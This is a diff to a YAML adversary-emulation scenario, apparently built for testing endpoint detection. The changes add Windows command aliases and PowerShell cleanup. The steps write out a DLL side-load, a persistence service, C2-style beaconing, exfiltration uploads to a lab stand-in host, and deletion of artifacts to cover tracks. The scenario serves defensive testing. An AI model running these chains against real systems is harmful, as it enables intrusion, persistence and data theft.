@@ -172,7 +172,7 @@ cgo_anchor:
 steps:
   - id: step-01
     name: "Stage the side-load pair — copied signed mscorsvw.exe beside an inert mscorsvc.dll"
-    command: |
+    command: &mp026-step-01-windows |
       $asm = 'C:\ProgramData\cortexsim-mp026\assembly'
       New-Item -ItemType Directory -Force -Path $asm | Out-Null
       $ngen = Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe'
@@ -184,6 +184,10 @@ steps:
     mitre_technique: "T1574.002"
     platforms: ["windows", "linux"]
     platform_variants:
+      # The Windows text is the primary above (an alias, so it cannot drift).
+      # Declared explicitly because the Windows resolver only takes a
+      # primary on a windows-ONLY step, and this one also runs on linux.
+      windows: *mp026-step-01-windows
       linux: |
         ASM=/var/tmp/.cortexsim-mp026/assembly
         mkdir -p "$ASM"
@@ -201,7 +205,7 @@ steps:
 
   - id: step-02
     name: "Persist as service msdnetsvc pointing at the relocated mscorsvw.exe (demand start)"
-    command: |
+    command: &mp026-step-02-windows |
       $bin = 'C:\ProgramData\cortexsim-mp026\assembly\mscorsvw.exe'
       if (-not (Get-Service -Name msdnetsvc -ErrorAction SilentlyContinue)) { sc.exe create msdnetsvc binPath= "$bin" start= demand DisplayName= msdnetsvc }
       sc.exe qc msdnetsvc
@@ -212,6 +216,10 @@ steps:
       pivot: process_lineage
     platforms: ["windows", "linux"]
     platform_variants:
+      # The Windows text is the primary above (an alias, so it cannot drift).
+      # Declared explicitly because the Windows resolver only takes a
+      # primary on a windows-ONLY step, and this one also runs on linux.
+      windows: *mp026-step-02-windows
       linux: |
         U=/etc/systemd/system/msdnetsvc.service
         if [ -e "$U" ]; then
@@ -237,7 +245,7 @@ steps:
 
   - id: step-03
     name: "Lambda-URL-shaped C2 polling from the side-load chain to the lab stand-in"
-    command: |
+    command: &mp026-step-03-windows |
       $stage = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
       $log = 'C:\ProgramData\cortexsim-mp026\beacon.log'
       foreach ($i in 1..4) {
@@ -253,6 +261,10 @@ steps:
       pivot: process_lineage
     platforms: ["windows", "linux"]
     platform_variants:
+      # The Windows text is the primary above (an alias, so it cannot drift).
+      # Declared explicitly because the Windows resolver only takes a
+      # primary on a windows-ONLY step, and this one also runs on linux.
+      windows: *mp026-step-03-windows
       linux: |
         LOG=/var/tmp/.cortexsim-mp026/beacon.log
         for i in 1 2 3 4; do
@@ -424,7 +436,7 @@ steps:
 
   - id: step-06
     name: "Tool drop — collector and cloud-storage uploader stand-ins written under ProgramData"
-    command: |
+    command: &mp026-step-06-windows |
       $drop = 'C:\ProgramData\cortexsim-mp026\tools'
       New-Item -ItemType Directory -Force -Path $drop | Out-Null
       foreach ($n in 'igfx.exe','GoogleGet.exe','google.exe','GoogleDrive.exe','GoogleDriveUpload.exe','Dropbox.exe') {
@@ -438,6 +450,10 @@ steps:
       pivot: process_lineage
     platforms: ["windows", "linux"]
     platform_variants:
+      # The Windows text is the primary above (an alias, so it cannot drift).
+      # Declared explicitly because the Windows resolver only takes a
+      # primary on a windows-ONLY step, and this one also runs on linux.
+      windows: *mp026-step-06-windows
       linux: |
         DROP=/var/tmp/.cortexsim-mp026/tools
         mkdir -p "$DROP"
@@ -455,7 +471,7 @@ steps:
 
   - id: step-07
     name: "Collection — find tariff-themed lab decoys, zip them per host, split into volumes"
-    command: |
+    command: &mp026-step-07-windows |
       $lab = 'C:\ProgramData\cortexsim-mp026'
       $docs = Join-Path $lab 'docs'
       $stg = Join-Path $lab 'stage'
@@ -481,6 +497,10 @@ steps:
       pivot: process_lineage
     platforms: ["windows", "linux"]
     platform_variants:
+      # The Windows text is the primary above (an alias, so it cannot drift).
+      # Declared explicitly because the Windows resolver only takes a
+      # primary on a windows-ONLY step, and this one also runs on linux.
+      windows: *mp026-step-07-windows
       linux: |
         LAB=/var/tmp/.cortexsim-mp026; DOCS=$LAB/docs; STG=$LAB/stage
         mkdir -p "$DOCS" "$STG"
@@ -502,7 +522,7 @@ steps:
 
   - id: step-08
     name: "Exfil attempt — upload the archive volumes to cloud-storage API paths on the lab stand-in"
-    command: |
+    command: &mp026-step-08-windows |
       $stage = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
       $stg = 'C:\ProgramData\cortexsim-mp026\stage'
       $log = 'C:\ProgramData\cortexsim-mp026\exfil.log'
@@ -520,6 +540,10 @@ steps:
       pivot: process_lineage
     platforms: ["windows", "linux"]
     platform_variants:
+      # The Windows text is the primary above (an alias, so it cannot drift).
+      # Declared explicitly because the Windows resolver only takes a
+      # primary on a windows-ONLY step, and this one also runs on linux.
+      windows: *mp026-step-08-windows
       linux: |
         STG=/var/tmp/.cortexsim-mp026/stage; LOG=/var/tmp/.cortexsim-mp026/exfil.log
         for part in "$STG"/*.tgz.[0-9][0-9][0-9]; do
@@ -538,10 +562,17 @@ steps:
 
   - id: step-09
     name: "Cover tracks — delete the archive volumes and the dropped payloads"
-    command: |
+    command: &mp026-step-09-windows |
       $lab = 'C:\ProgramData\cortexsim-mp026'
       Get-ChildItem -Path (Join-Path $lab 'stage'), (Join-Path $lab 'tools') -File -ErrorAction SilentlyContinue | Remove-Item -Force
       Get-ChildItem -Path $lab -Recurse -File | Select-Object FullName | Format-Table -AutoSize
+      # A pull run never executes scenario cleanup, so the chain's own
+      # persistence and lab directory go here, at the end of its last Windows
+      # step. The service is deleted only when it is the one step-02 created
+      # (its binPath is under the lab directory).
+      Get-CimInstance -ClassName Win32_Service -Filter "Name='msdnetsvc'" -ErrorAction SilentlyContinue | Where-Object PathName -Like '*cortexsim-mp026*' | Invoke-CimMethod -MethodName Delete | Out-Null
+      Remove-Item -Recurse -Force -ErrorAction SilentlyContinue -Path $lab
+      Write-Output 'cortexsim-mp-026-windows-residue-removed'
     identity: root
     mitre_technique: "T1070.004"
     causality:
@@ -549,6 +580,10 @@ steps:
       pivot: process_lineage
     platforms: ["windows", "linux"]
     platform_variants:
+      # The Windows text is the primary above (an alias, so it cannot drift).
+      # Declared explicitly because the Windows resolver only takes a
+      # primary on a windows-ONLY step, and this one also runs on linux.
+      windows: *mp026-step-09-windows
       linux: |
         LAB=/var/tmp/.cortexsim-mp026
         find "$LAB/stage" "$LAB/tools" -type f -delete
@@ -567,9 +602,17 @@ steps:
 
 cleanup:
   commands:
-    - "command -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command 'if (sc.exe qc msdnetsvc 2>$null | Select-String -Quiet -SimpleMatch cortexsim-mp026) { sc.exe delete msdnetsvc }; Remove-Item -Recurse -Force -Path '\\''C:\\ProgramData\\cortexsim-mp026'\\'' -ErrorAction SilentlyContinue' || true"
     - "if grep -qs cortexsim-mp026 /etc/systemd/system/msdnetsvc.service; then rm -f /etc/systemd/system/msdnetsvc.service; command -v systemctl >/dev/null 2>&1 && systemctl daemon-reload; fi; true"
     - "rm -f /tmp/mp-026-beacon.yml /tmp/mp-026-threat.yml && rm -rf /var/tmp/.cortexsim-mp026"
+    # Native Windows teardown (CONT-11). The previous form wrapped pwsh in bash
+    # (`command -v pwsh && pwsh -Command ...`), which the Windows bundle skips,
+    # so Windows never ran it. These lines are PowerShell the Windows bundle
+    # runs. The bash bundle and the K8s bootstrap do NOT run them:
+    # push_generator withholds a Windows-only cleanup line from the POSIX
+    # target and names it in a `# skipped (Windows-only)` comment. The service
+    # is deleted only when its binPath is the lab copy step-02 registered.
+    - "Get-CimInstance -ClassName Win32_Service -Filter \"Name='msdnetsvc'\" -ErrorAction SilentlyContinue | Where-Object PathName -Like '*cortexsim-mp026*' | Invoke-CimMethod -MethodName Delete"
+    - "Remove-Item -Recurse -Force -ErrorAction SilentlyContinue -Path 'C:\\ProgramData\\cortexsim-mp026'"
 
 author: "Henry Reed"
 created: "2026-10-27"
